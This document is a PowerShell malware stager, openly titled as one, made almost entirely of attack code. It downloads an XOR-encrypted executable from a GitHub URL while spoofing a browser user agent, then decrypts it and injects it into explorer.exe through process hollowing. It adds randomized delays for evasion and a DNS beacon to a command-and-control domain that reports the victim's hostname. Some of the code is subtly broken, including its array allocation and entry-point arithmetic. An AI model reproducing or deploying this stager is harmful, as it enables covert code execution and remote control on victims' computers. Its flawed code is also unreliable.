# Ultimate 2025 Payload Stager - XOR Decrypt + Process Hollowing (Zero-Footprint)
Add-Type -MemberDefinition @'
using System; using System.Runtime.InteropServices;
public class H {
    [DllImport("kernel32.dll")] public static extern IntPtr OpenProcess(uint a, bool b, uint c);
    [DllImport("ntdll.dll")] public static extern uint NtSuspendProcess(IntPtr h);
    [DllImport("ntdll.dll")] public static extern uint NtUnmapViewOfSection(IntPtr h, IntPtr b);
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32.dll")] public static extern IntPtr OpenThread(uint a, bool b, uint tid);
    [DllImport("kernel32.dll")] public static extern bool GetThreadContext(IntPtr h, [MarshalAs(UnmanagedType.LPArray)] byte[] c);
    [DllImport("kernel32.dll")] public static extern bool SetThreadContext(IntPtr h, [MarshalAs(UnmanagedType.LPArray)] byte[] c);
    [DllImport("kernel32.dll")] public static extern uint NtResumeProcess(IntPtr h);
}
'@

Start-Sleep -Milliseconds (Get-Random -Min 1200 -Max 2600)

# Obfuscated Download
$uChunks = @('https://github.com/jokerxgutea/testhtb/raw/refs/heads/main/hh3tgn_enc.exe')
$url = $uChunks -join ''
$wc = New-Object Net.WebClient
$wc.Headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36'
$enc = $wc.DownloadData($url)

# XOR Decrypt (key 0xAA)
$exe = [byte[]] $enc.Length
for ($i = 0; $i -lt $enc.Length; $i++) { $exe[$i] = $enc[$i] -bxor 0xAA }

# Process Hollowing (2025 Hollowing: Suspend, Unmap, Map PE, Resume)
$proc = Get-Process explorer | Select -First 1
$pid = $proc.Id
$hProc = [H]::OpenProcess(0x1F0FFF, $false, $pid)
[H]::NtSuspendProcess($hProc)
$th = [H]::OpenThread(0x1F03FF, $false, $proc.Threads[0].Id)
$ctx = [byte[]] 0x4D0  # CONTEXT structure size
[H]::GetThreadContext($th, $ctx)
$base = [BitConverter]::ToInt64($ctx, 0x10)  # PEB ImageBase
[H]::NtUnmapViewOfSection($hProc, [IntPtr]$base)
$newBase = [H]::VirtualAllocEx($hProc, [IntPtr]$base, $exe.Length, 0x3000, 0x40)
$written = 0
[H]::WriteProcessMemory($hProc, $newBase, $exe, $exe.Length, [ref]$written)
$entry = $newBase.ToInt64() + [BitConverter]::ToUInt32($exe, 0x3C) + 0x28  # Entry point offset
[BitConverter]::GetBytes($entry).CopyTo($ctx, 0xF8)  # RCX = entry
[H]::SetThreadContext($th, $ctx)
[H]::NtResumeProcess($hProc)

# Optional DNS Beacon (если нужно, убери)
try { Resolve-DnsName "success-$(hostname).yourc2domain.com" -Type TXT -ErrorAction SilentlyContinue } catch {}
exit
